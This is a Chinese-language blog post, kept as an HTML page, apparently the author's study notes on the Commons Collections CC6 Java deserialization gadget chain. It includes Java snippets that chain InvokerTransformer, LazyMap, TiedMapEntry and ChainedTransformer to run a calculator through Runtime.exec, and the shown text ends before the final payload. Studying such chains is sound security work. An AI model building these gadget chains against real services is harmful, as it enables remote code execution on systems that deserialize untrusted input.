<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>CommonCollections反序列化-CC6链 | 阿珍爱上了阿强</title><meta name="description" content="前言 不知道从哪听来的，要学反序列化，先学CC链。CC链研究了很久，由于反序列化需要CC的版本和java的版本都有需求，在尝试复现ysoserial中的CC链时，遇到了跟多困难，不知道为什么尝试了1.8.0_65和1.7还有1.8.0_171的jdk再复现CC1和4的时候找不到需要的类，最后发现CC6是可以的，果然HASHMAP是最无敌的。  分析 反序列化简而言之就是需要我们构造一个paylo"><meta property="og:type" content="article"><meta property="og:title" content="CommonCollections反序列化-CC6链"><meta property="og:url" content="http://example.com/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="前言 不知道从哪听来的，要学反序列化，先学CC链。CC链研究了很久，由于反序列化需要CC的版本和java的版本都有需求，在尝试复现ysoserial中的CC链时，遇到了跟多困难，不知道为什么尝试了1.8.0_65和1.7还有1.8.0_171的jdk再复现CC1和4的时候找不到需要的类，最后发现CC6是可以的，果然HASHMAP是最无敌的。  分析 反序列化简而言之就是需要我们构造一个paylo"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://z3.ax1x.com/2021/10/16/5J2mL9.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/16/5JRyh6.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/16/5JRzEn.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/16/5JoaPs.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/16/5JTSL8.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5YqAIO.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tM02D.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tM4xg.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tQYQg.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tldje.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5t1nUI.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5t1rMF.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5t3JSK.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5t3gOg.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5t85HH.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tUGEF.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tUag1.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5twWvR.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5trpa6.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5trVsA.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tryLR.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5trzlQ.png"><meta property="og:image" content="https://z3.ax1x.com/2021/10/17/5tsnX9.png"><meta property="article:published_time" content="2021-10-17T12:59:05.000Z"><meta property="article:modified_time" content="2021-10-17T13:00:20.070Z"><meta property="article:author" content="John Doe"><meta property="article:tag" content="java反序列化"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://z3.ax1x.com/2021/10/16/5J2mL9.png"><link rel="canonical" href="http://example.com/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/index.html"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.0"></head><body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/cofess" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">阿海已经听过这首歌</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">OKC!!!</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> nanjin, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="Search"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav"><li class="menu-item menu-item-home"><a href="/null"><i class="icon icon-home-fill"></i> <span class="menu-title">Home</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">Archives</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">Categories</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">Tags</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">Repository</span></a></li><li class="menu-item menu-item-books"><a href="/books"><i class="icon icon-book-fill"></i> <span class="menu-title">Books</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">Links</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">About</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle="tooltip" data-placement="top"><i class="icon icon-weibo"></i></a></li><li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="icon icon-twitter"></i></a></li><li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle="tooltip" data-placement="top"><i class="icon icon-behance"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">Board</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">Tags</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">breach 渗透测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">breach1.0 渗透测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">fastjson反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap-api/" rel="tag">sqlmap api</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap-api/" rel="tag">sqlmap-api</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">xss 渗透测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F/" rel="tag">域</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" rel="tag">渗透测试学习</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">Tag Cloud</h3><div class="widget-body tagcloud"><a href="/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size:13px">breach 渗透测试</a> <a href="/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size:13px">breach1.0 渗透测试</a> <a href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">fastjson反序列化</a> <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:14px">java反序列化</a> <a href="/tags/sqlmap-api/" style="font-size:13px">sqlmap api</a> <a href="/tags/sqlmap-api/" style="font-size:13px">sqlmap-api</a> <a href="/tags/xss-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size:13px">xss 渗透测试</a> <a href="/tags/%E5%9F%9F/" style="font-size:13px">域</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size:13px">域渗透</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size:13px">渗透测试</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" style="font-size:13px">渗透测试学习</a></div></div><div class="widget"><h3 class="widget-title">Archive</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">12</span></li></ul></div></div><div class="widget"><h3 class="widget-title">Recent Posts</h3><div class="widget-body"><ul class="recent-post-list list-unstyled no-thumbnail"><li><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" class="title">CommonCollections反序列化-CC6链</a></p><p class="item-date"><time datetime="2021-10-17T12:59:05.000Z" itemprop="datePublished">2021-10-17</time></p></div></li><li><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/2021/10/15/%E3%80%8AFastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%8B/" class="title">《Fastjson反序列化漏洞学习笔记》</a></p><p class="item-date"><time datetime="2021-10-15T07:53:53.000Z" itemprop="datePublished">2021-10-15</time></p></div></li><li><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/2021/09/28/%E5%9F%9F%E5%86%85%E7%9A%84%E5%A7%94%E6%B4%BE%E5%92%8C%E5%88%A9%E7%94%A8%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/" class="title">域内的委派和利用委派攻击学习</a></p><p class="item-date"><time datetime="2021-09-28T06:09:22.000Z" itemprop="datePublished">2021-09-28</time></p></div></li><li><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/2021/09/25/DC-9%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="title">DC-9靶场渗透</a></p><p class="item-date"><time datetime="2021-09-25T11:10:33.000Z" itemprop="datePublished">2021-09-25</time></p></div></li><li><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/2021/09/21/java%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS%E9%93%BE%E5%88%86%E6%9E%90/" class="title">java反射和URLDNS链分析</a></p><p class="item-date"><time datetime="2021-09-21T09:21:56.000Z" itemprop="datePublished">2021-09-21</time></p></div></li></ul></div></div></div></aside><main class="main" role="main"><div class="content"><article id="post-CommonCollections反序列化-CC6链" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">CommonCollections反序列化-CC6链</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" class="article-date"><time datetime="2021-10-17T12:59:05.000Z" itemprop="datePublished">2021-10-17</time> </a></span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a> </span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/#comments" class="article-comment-link">Comments</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>不知道从哪听来的，要学反序列化，先学CC链。CC链研究了很久，由于反序列化需要CC的版本和java的版本都有需求，在尝试复现ysoserial中的CC链时，遇到了跟多困难，不知道为什么尝试了1.8.0_65和1.7还有1.8.0_171的jdk再复现CC1和4的时候找不到需要的类，最后发现CC6是可以的，果然HASHMAP是最无敌的。</p><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><p>反序列化简而言之就是需要我们构造一个payload发送给服务端，服务端反序列化我们发送的数据，这时候我们在传递过去的类的readObject方法中的代码就会被执行，达到攻击的目的。</p><p>这时候我们需要一个位置可以传入任意方法，还要能传递任意参数，最开始的入口类还重写了readObject方法。</p><p>首先我们可以知道漏洞发现者发现了一个Transform接口，用来对传入的对象做一些transform转变</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5J2mL9"><img src="https://z3.ax1x.com/2021/10/16/5J2mL9.png" alt="5J2mL9.png"></a></p><p>我们根据作者的思路找到接口的实现类，找到InvokerTransformer类，进入看到他的Transform方法</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5JRyh6"><img src="https://z3.ax1x.com/2021/10/16/5JRyh6.png" alt="5JRyh6.png"></a></p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5JRzEn"><img src="https://z3.ax1x.com/2021/10/16/5JRzEn.png" alt="5JRzEn.png"></a></p><p>我们查看代码，可以知道InvokerTransformer的transform方法，其实就是一个集成的反射调用，分析代码，可以看出接收一个input对象，对他进行反射调用，方法，最后接收的参数都是可以被控制的。因此，InvokeTransform.transform是一个很标准的结束点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure><p>使用这个方法弹出计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>我们知道InvokerTransform的transform方法是结束方法，就要向前逆推寻找整个调用链，我们就得找一个不同的类而且调用了这里的transform方法，比如是S调用了这里的transform方法，我们就要找有谁调用了S，一步一步最终回到readObject。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5JoaPs"><img src="https://z3.ax1x.com/2021/10/16/5JoaPs.png" alt="5JoaPs.png"></a></p><p>根据作者的利用链，找到了LazyMap类里的get方法，看注释LazyMap是为了在调用的时候不传入key，在调用get方法的时候再获取key,这里要注意当传入的值存在key的时候不会调用transform方法，所有我们在传递参数的时候需要不传入key。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5JTSL8"><img src="https://z3.ax1x.com/2021/10/16/5JTSL8.png" alt="5JTSL8.png"></a></p><p>再找是谁调用了get方法查找用例，结果超级多，不知道是怎么找到的。根据作者的利用链是TiedMapEntry类中的getValue()方法，再查找getValue()的用例，在同一个类里找到了hashCode()方法，就回到了和之前URLDNS链十分相似的情况。最终调用回HASHMAP的readObject方法，回到和DNS链相似的情况，我们需要找到一个类的hashcode调用了get。</p><p>因此如果没有别的问题，我们的利用链应该就是：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5YqAIO"><img src="https://z3.ax1x.com/2021/10/17/5YqAIO.png" alt="5YqAIO.png"></a></p><p>针对上面的利用链，以弹出计算器为例，一步一步尝试复现：</p><p>首先是直接调用InvokerTransform的transform方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tM02D"><img src="https://z3.ax1x.com/2021/10/17/5tM02D.png" alt="5tM02D.png"></a></p><p>然后我们找到Lazymap中的get方法，方法代码如下：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tM4xg"><img src="https://z3.ax1x.com/2021/10/17/5tM4xg.png" alt="5tM4xg.png"></a></p><p>注释可以看到，get方法的作用就是为没有传入key的map，根据key返回一个value，在这里我们看到要进入transform方法我们要控制两个参数一个是factory，一个是key。为了知道factory是从传入的，我们在LazyMap里找一下，看到他的构造函数。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tQYQg"><img src="https://z3.ax1x.com/2021/10/17/5tQYQg.png" alt="5tQYQg.png"></a></p><p>可以看到我们可以传入一个transform类控制factory，当然就是我们上面得InvokerTransformer。此外我们还需要传入一个map，这个map我们直接new一个HashMap就可以。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tldje"><img src="https://z3.ax1x.com/2021/10/17/5tldje.png" alt="5tldje.png"></a></p><p>那么我们需要实现一个LazyMap类，找到decorate方法，可以看到对一个Map类decorate，就可以返回一个&quot;lazymap&quot;。(笔者对java并不熟悉，所以可能说的不是那么准确)。如此，我们就可以上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"><span class="comment">//      一个Transformer类</span></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//       一个map类</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据利用链继续找到TiedMapEntry的getValue()方法</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5t1nUI"><img src="https://z3.ax1x.com/2021/10/17/5t1nUI.png" alt="5t1nUI.png"></a></p><p>可以看到需要传入一个map，一个key。找到TiedMapEntry的构造方法</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5t1rMF"><img src="https://z3.ax1x.com/2021/10/17/5t1rMF.png" alt="5t1rMF.png"></a></p><p>我们构造一个TiedMapEntry对象，传入lazymap和我们要调用的对象r，在调用他的getvalue()方法，可以看到成功弹出计算器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"><span class="comment">//      一个Transformer类</span></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//       新建一个map类</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazymap,r);</span><br><span class="line"></span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5t3JSK"><img src="https://z3.ax1x.com/2021/10/17/5t3JSK.png" alt="5t3JSK.png"></a></p><p>然后找到调用了getvalue()方法的同目录下的hashcode()方法，这里我们只要把getvalue()改成hashcode()就可以实现弹出计算器。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5t3gOg"><img src="https://z3.ax1x.com/2021/10/17/5t3gOg.png" alt="5t3gOg.png"></a></p><p>接下来我们就需要寻找，是谁调用了这里的hashcode()方法，这时候就和之前的DNS链差不多了。我们new一个HashMap，使用put方法传入两个参数key和value，HashMap根据我们传入的key，调用key的hashcode()方法，我们传入TiedMapEntry，就会实现TiedMapEntry.hashcode()。这样就达到了我们需要的效果。</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5t85HH"><img src="https://z3.ax1x.com/2021/10/17/5t85HH.png" alt="5t85HH.png"></a></p><h3 id="实现反序列化调用"><a class="markdownIt-Anchor" href="#实现反序列化调用"></a> 实现反序列化调用</h3><p>首先回到反序列化的必要条件之一，就是这个对象得可以被反序列化，要实现Serializable接口。我们在前面的例子中，我们的程序可以执行，但是反序列化时却会失败，因为我们的r，RunTime是不可以序列化的，但是他的Class是可以序列化的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c = Runtime.class</span><br></pre></td></tr></table></figure><p>这里的Class是可以序列化的！所以我们要采用不同于前面讲的反射方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">Method getRuntimeMethod = c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">Runtime r = (Runtime) getRuntimeMethod.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">Method execMethod = c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用最开始的InvokerTransformer来进行反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntimeMethod = (Method) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125; ,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125; ).transform(Runtime.class);</span><br><span class="line">      Runtime m = (Runtime) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line">      <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(m);</span><br></pre></td></tr></table></figure><p>执行之后可以看到也成功淡出了计算机，但是还是太复杂了。commoncollections的作者还真就提供了一个类用来链式调用，我们在最开始查看transform的实现类的时候可以看到有个ChainedTransformer</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tUGEF"><img src="https://z3.ax1x.com/2021/10/17/5tUGEF.png" alt="5tUGEF.png"></a></p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tUag1"><img src="https://z3.ax1x.com/2021/10/17/5tUag1.png" alt="5tUag1.png"></a></p><p>可以看到我们可以利用他的transform方法对iTransformers里的对象进行循环调用。我们先建立一个 Transformer[]。然后循环调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      Transformer[] transformers = <span class="keyword">new</span>  Transformer[]&#123;</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">              <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125; )</span><br><span class="line">      &#125;;</span><br><span class="line">      ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>到这里我们成功实现了将目标可反序列化。我们加入之前的代码看看效果：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5twWvR"><img src="https://z3.ax1x.com/2021/10/17/5twWvR.png" 